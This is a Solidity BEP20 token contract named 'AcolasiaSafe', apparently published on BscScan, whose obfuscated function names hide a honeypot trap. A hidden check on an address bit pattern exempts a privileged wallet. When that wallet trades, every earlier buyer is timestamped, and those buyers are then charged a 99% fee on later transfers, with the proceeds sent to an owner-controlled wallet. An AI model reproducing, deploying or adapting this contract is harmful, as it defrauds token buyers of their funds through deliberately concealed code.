/**
 *Submitted for verification at BscScan.com on 2022-12-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract AcolasiaSafe is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Acolasia Safe ";
    string constant _symbol = "AcolasiaSafe";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private isLaunchedWalletAuto;
    mapping(address => bool) private minIsMarketingLiquidity;
    mapping(address => bool) private liquidityLimitWalletReceiver;
    mapping(address => bool) private teamModeIsLaunched;
    mapping(address => uint256) private autoBotsTxReceiver;
    mapping(uint256 => address) private swapMarketingModeMin;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private marketingMaxLaunchedTeam = 0;
    uint256 private burnBotsSwapBuyLimitMinExempt = 8;

    //SELL FEES
    uint256 private maxBurnSellTx = 0;
    uint256 private buyLimitMaxWallet = 8;

    uint256 private minAutoSellExempt = burnBotsSwapBuyLimitMinExempt + marketingMaxLaunchedTeam;
    uint256 private botsMarketingLimitExemptBurnFee = 100;

    address private swapTxMinBots = (msg.sender); // auto-liq address
    address private liquidityReceiverIsFee = (0xcD1B76114BC7Af9C36694Dc2FfFFCC4e9dCfc0DA); // marketing address
    address private liquidityExemptSellLaunched = DEAD;
    address private tradingTxAutoLiquidityWalletSellLaunched = DEAD;
    address private liquidityTradingTxWallet = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private feeIsBuyReceiver;
    uint256 private feeMinTeamSwap;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private feeReceiverWalletBurnLaunchedModeMin;
    uint256 private liquidityAutoIsTx;
    uint256 private sellMarketingFeeMaxIs;
    uint256 private minLimitSwapLaunched;
    uint256 private txAutoBurnSwapBotsTeamFee;

    bool private txIsMaxLiquidity = true;
    bool private teamModeIsLaunchedMode = true;
    bool private exemptSwapBotsSellWallet = true;
    bool private teamMaxMarketingLimitFee = true;
    bool private swapBuyTxLaunched = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private limitReceiverSellFee = _totalSupply / 1000; // 0.1%

    
    bool private isAutoMinBots;
    uint256 private sellSwapTradingMin;
    uint256 private sellModeSwapMaxTxBurnReceiver;
    uint256 private liquidityIsReceiverWallet;
    uint256 private receiverMarketingModeTxTeamWalletBuy;
    bool private autoSwapLiquidityMarketingMinIsTrading;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        feeReceiverWalletBurnLaunchedModeMin = true;

        isLaunchedWalletAuto[msg.sender] = true;
        isLaunchedWalletAuto[address(this)] = true;

        minIsMarketingLiquidity[msg.sender] = true;
        minIsMarketingLiquidity[0x0000000000000000000000000000000000000000] = true;
        minIsMarketingLiquidity[0x000000000000000000000000000000000000dEaD] = true;
        minIsMarketingLiquidity[address(this)] = true;

        liquidityLimitWalletReceiver[msg.sender] = true;
        liquidityLimitWalletReceiver[0x0000000000000000000000000000000000000000] = true;
        liquidityLimitWalletReceiver[0x000000000000000000000000000000000000dEaD] = true;
        liquidityLimitWalletReceiver[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return receiverWalletLiquidityBots(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return receiverWalletLiquidityBots(sender, recipient, amount);
    }

    function receiverWalletLiquidityBots(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = walletLimitMaxSwapReceiverBurn(sender) || walletLimitMaxSwapReceiverBurn(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                exemptMarketingLimitTeamSwapMode();
            }
            if (!bLimitTxWalletValue) {
                tradingLimitAutoLaunchedSellBotsExempt(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return launchedTeamIsWallet(sender, recipient, amount);}

        if (!isLaunchedWalletAuto[sender] && !isLaunchedWalletAuto[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || liquidityLimitWalletReceiver[sender] || liquidityLimitWalletReceiver[recipient], "Max TX Limit has been triggered");

        if (txWalletTradingIsMode()) {burnSwapFeeMax();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = limitBotsLaunchedTx(sender) ? tradingMaxBotsTeam(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function launchedTeamIsWallet(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function limitBotsLaunchedTx(address sender) internal view returns (bool) {
        return !minIsMarketingLiquidity[sender];
    }

    function burnMinTxAuto(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            minAutoSellExempt = buyLimitMaxWallet + maxBurnSellTx;
            return minBurnMarketingExemptSell(sender, minAutoSellExempt);
        }
        if (!selling && sender == uniswapV2Pair) {
            minAutoSellExempt = burnBotsSwapBuyLimitMinExempt + marketingMaxLaunchedTeam;
            return minAutoSellExempt;
        }
        return minBurnMarketingExemptSell(sender, minAutoSellExempt);
    }

    function tradingMaxBotsTeam(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(burnMinTxAuto(sender, receiver == uniswapV2Pair)).div(botsMarketingLimitExemptBurnFee);

        if (teamModeIsLaunched[sender] || teamModeIsLaunched[receiver]) {
            feeAmount = amount.mul(99).div(botsMarketingLimitExemptBurnFee);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function walletLimitMaxSwapReceiverBurn(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function minBurnMarketingExemptSell(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = autoBotsTxReceiver[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function tradingLimitAutoLaunchedSellBotsExempt(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        swapMarketingModeMin[exemptLimitValue] = addr;
    }

    function exemptMarketingLimitTeamSwapMode() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (autoBotsTxReceiver[swapMarketingModeMin[i]] == 0) {
                    autoBotsTxReceiver[swapMarketingModeMin[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(liquidityReceiverIsFee).transfer(amountBNB * amountPercentage / 100);
    }

    function txWalletTradingIsMode() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    swapBuyTxLaunched &&
    _balances[address(this)] >= limitReceiverSellFee;
    }

    function burnSwapFeeMax() internal swapping {
        uint256 amountToLiquify = limitReceiverSellFee.mul(marketingMaxLaunchedTeam).div(minAutoSellExempt).div(2);
        uint256 amountToSwap = limitReceiverSellFee.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = minAutoSellExempt.sub(marketingMaxLaunchedTeam.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(marketingMaxLaunchedTeam).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(burnBotsSwapBuyLimitMinExempt).div(totalETHFee);

        payable(liquidityReceiverIsFee).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                swapTxMinBots,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getLiquidityExemptSellLaunched() public view returns (address) {
        if (liquidityExemptSellLaunched == tradingTxAutoLiquidityWalletSellLaunched) {
            return tradingTxAutoLiquidityWalletSellLaunched;
        }
        if (liquidityExemptSellLaunched == liquidityExemptSellLaunched) {
            return liquidityExemptSellLaunched;
        }
        if (liquidityExemptSellLaunched == liquidityExemptSellLaunched) {
            return liquidityExemptSellLaunched;
        }
        return liquidityExemptSellLaunched;
    }
    function setLiquidityExemptSellLaunched(address a0) public onlyOwner {
        if (liquidityExemptSellLaunched == liquidityExemptSellLaunched) {
            liquidityExemptSellLaunched=a0;
        }
        liquidityExemptSellLaunched=a0;
    }

    function getExemptSwapBotsSellWallet() public view returns (bool) {
        return exemptSwapBotsSellWallet;
    }
    function setExemptSwapBotsSellWallet(bool a0) public onlyOwner {
        if (exemptSwapBotsSellWallet != swapBuyTxLaunched) {
            swapBuyTxLaunched=a0;
        }
        exemptSwapBotsSellWallet=a0;
    }

    function getTradingTxAutoLiquidityWalletSellLaunched() public view returns (address) {
        if (tradingTxAutoLiquidityWalletSellLaunched == liquidityTradingTxWallet) {
            return liquidityTradingTxWallet;
        }
        return tradingTxAutoLiquidityWalletSellLaunched;
    }
    function setTradingTxAutoLiquidityWalletSellLaunched(address a0) public onlyOwner {
        tradingTxAutoLiquidityWalletSellLaunched=a0;
    }

    function getLiquidityTradingTxWallet() public view returns (address) {
        if (liquidityTradingTxWallet != liquidityTradingTxWallet) {
            return liquidityTradingTxWallet;
        }
        return liquidityTradingTxWallet;
    }
    function setLiquidityTradingTxWallet(address a0) public onlyOwner {
        if (liquidityTradingTxWallet == swapTxMinBots) {
            swapTxMinBots=a0;
        }
        if (liquidityTradingTxWallet == liquidityTradingTxWallet) {
            liquidityTradingTxWallet=a0;
        }
        if (liquidityTradingTxWallet != liquidityReceiverIsFee) {
            liquidityReceiverIsFee=a0;
        }
        liquidityTradingTxWallet=a0;
    }

    function getMinIsMarketingLiquidity(address a0) public view returns (bool) {
        if (a0 != liquidityTradingTxWallet) {
            return exemptSwapBotsSellWallet;
        }
        if (a0 != tradingTxAutoLiquidityWalletSellLaunched) {
            return txIsMaxLiquidity;
        }
            return minIsMarketingLiquidity[a0];
    }
    function setMinIsMarketingLiquidity(address a0,bool a1) public onlyOwner {
        if (a0 != liquidityReceiverIsFee) {
            txIsMaxLiquidity=a1;
        }
        minIsMarketingLiquidity[a0]=a1;
    }

    function getLiquidityLimitWalletReceiver(address a0) public view returns (bool) {
            return liquidityLimitWalletReceiver[a0];
    }
    function setLiquidityLimitWalletReceiver(address a0,bool a1) public onlyOwner {
        if (liquidityLimitWalletReceiver[a0] == minIsMarketingLiquidity[a0]) {
           minIsMarketingLiquidity[a0]=a1;
        }
        if (a0 != swapTxMinBots) {
            teamModeIsLaunchedMode=a1;
        }
        if (a0 == liquidityReceiverIsFee) {
            txIsMaxLiquidity=a1;
        }
        liquidityLimitWalletReceiver[a0]=a1;
    }

    function getTxIsMaxLiquidity() public view returns (bool) {
        if (txIsMaxLiquidity != teamModeIsLaunchedMode) {
            return teamModeIsLaunchedMode;
        }
        if (txIsMaxLiquidity != teamMaxMarketingLimitFee) {
            return teamMaxMarketingLimitFee;
        }
        return txIsMaxLiquidity;
    }
    function setTxIsMaxLiquidity(bool a0) public onlyOwner {
        if (txIsMaxLiquidity == exemptSwapBotsSellWallet) {
            exemptSwapBotsSellWallet=a0;
        }
        txIsMaxLiquidity=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}